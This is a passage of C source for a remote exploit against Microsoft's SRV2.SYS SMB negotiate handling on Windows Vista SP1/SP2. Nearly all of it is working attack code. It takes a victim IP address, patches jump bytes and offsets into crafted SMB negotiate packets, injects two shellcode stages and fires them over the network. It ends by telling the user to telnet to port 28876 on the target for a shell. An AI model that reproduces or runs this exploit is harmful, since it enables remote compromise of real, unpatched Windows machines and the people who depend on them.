	*(u16*)(p + 0x0a) = 0x54EB;
	*(u16*)(p + 0x62) = 0x7BEB;
	*(u16*)(p + 0xDB + 4) = 0x7BEB;
	*(u16*)(p + 0xDB + 4 + 125) = 0x20EB;


	// for vista ultimate sp1
	*(u8*)(p + 0xC8 + 4) = 0xCC;
	*(u32*)(p + 0xA8 + 4) = 0x00000000;
	*(u32*)(p + 0x30 + 4) = READ_ADDR;			// same us upper one
	*(u8*)(p + 0x0E0 + 4) = 0;

	memcpy((void*)(p + 0x17a + 4), (void*)&shellcode_stage1, sizeof(shellcode_stage1));

	if (!init_connection())
	{
		printf("Fatal: communicating with target failed\n");
		return 0;
	}


	printf("Now doing the middle boom, boom!\n");
	if (send(sock, (const char*)nr, SHELL_PAGE, 0) == SOCKET_ERROR)
	{
		printf("Fatal: cannot trigger the exploit, last error = %d!\n", WSAGetLastError());
		return 0;
	}

	closesocket(sock);
	return 1;
}


int go_exploit_finial(void)
{
	unsigned char *p = (unsigned char*)nr;
	nr->hdr.PidHigh = PID_FUNC;
	*(u16*)(p + 0x0a) = 0x54EB;						// jmp forward

	memcpy((void*)(p + 0x62), (void*)&shellcode_stage2, sizeof(shellcode_stage2));


	if (!init_connection())
	{
		printf("Fatal: communicating with target failed\n");
		return 0;
	}


	printf("Doing the final boom boom!\n");
	if (send(sock, (const char*)nr, SHELL_PAGE, 0) == SOCKET_ERROR)
	{
		printf("Fatal: cannot trigger the exploit, last error = %d!\n", WSAGetLastError());
		return 0;
	}

	return 1;
}



int main(int argc, char *argv[])
{
	int					probe;
	WSADATA				wsaData;
	u8					*xlen;


	printf("Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference\n");
	printf("Exploited by Piotr Bania // www.piotrbania.com\n");
	printf("Exploit for Windows Vista SP1/SP2!\n\n");


	if (argc < 4)
	{
		printf("Usage: %s <ip> <sleep_time> <probe#>\n", argv[0]);
		printf("Where:\n");
		printf("ip\t\t- IP address of the victim\n");
		printf("sleep_time\t- sleep time between sending packets\n");
		printf("probe\t\t- if previous probes failed, new offset is required [0-%d]\n", TRAMPOLINE_ADDRS_SIZE);
		return 0;
	}

	probe = atoi(argv[3]);
	sleep_time = atoi(argv[2]);
	printf("Attacking %s:%d (sleep=%d) - probe #%d... \n", argv[1], XPORT, sleep_time, probe);

	if (sleep_time < DEFAULT_SLEEP)
	{
		printf("Warning: sleep_time < %d (DEFAULT)\n", DEFAULT_SLEEP);
	}

	if (probe > TRAMPOLINE_ADDRS_SIZE)
	{
		printf("Invalid probe number!\n");
		return 0;
	}


	TRAMPOLINE_ADDR = TRAMPOLINE_ADDRS[probe];
	TRAMPOLINE_ADDR_ABS_SP2 += TRAMPOLINE_ADDR;
	TRAMPOLINE_ADDR_ABS_SP1_ULTIMATE += TRAMPOLINE_ADDR;

	printf("Using 0x%08x as trampoline address\n", TRAMPOLINE_ADDR);

	SHELL_SIZE = align(sizeof(shellcode_stage2), 0x100);


	nr = (NEGOTIATE_REQ*)malloc(SHELL_PAGE);
	if (nr == NULL)
	{
		printf("Failed to allocate memory\n");
		return 0;

	}


	if (WSAStartup(MAKEWORD(2, 0), &wsaData))
	{
		printf("Failed to initialize winsock, last error = %d\n", WSAGetLastError());
		return 0;
	}


	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		printf("Error at socket(): %d\n", WSAGetLastError());
		WSACleanup();
		return 0;
	}

	client.sin_family = AF_INET;
	client.sin_addr.s_addr = inet_addr(argv[1]);
	client.sin_port = htons(XPORT);


	if (connect(sock, (SOCKADDR*)&client, sizeof(client)) == SOCKET_ERROR)
	{
		printf("Failed to connect.\n");
		closesocket(sock);
		WSACleanup();
		return 0;
	}



	memset((void*)nr, 0x90, SHELL_PAGE);
	memcpy((void*)nr, (void*)&data, sizeof(data));

	nr->u8Count = SHELL_SIZE;
	u32 len = sizeof(data) + SHELL_SIZE;


	// calc length for samba packet
	xlen = (unsigned char *)&nr->hdr.smb_buf_length;
	xlen[0] = (len & 0xFF000000) >> 24;
	xlen[1] = (len & 0xFF0000) >> 16;
	xlen[2] = (len & 0xFF00) >> 8;
	xlen[3] = (len & 0xFF);


	// exploit main
#define check_err(x)				{ if (!x) {											\
												free((void*)nr);						\
												closesocket(sock);						\
												WSACleanup();							\
												printf("Fatal error, aborting!\n");		\
												return 0; } }

	check_err(init_trampoline());
	Sleep(sleep_time * 2);
	check_err(go_exploit());
	Sleep(sleep_time * 2);
	check_err(go_exploit_finial());


	printf("All done, telnet to %s:28876 !\n", argv[1]);

	free((void*)nr);
	closesocket(sock);
	WSACleanup();
	return 0;
}
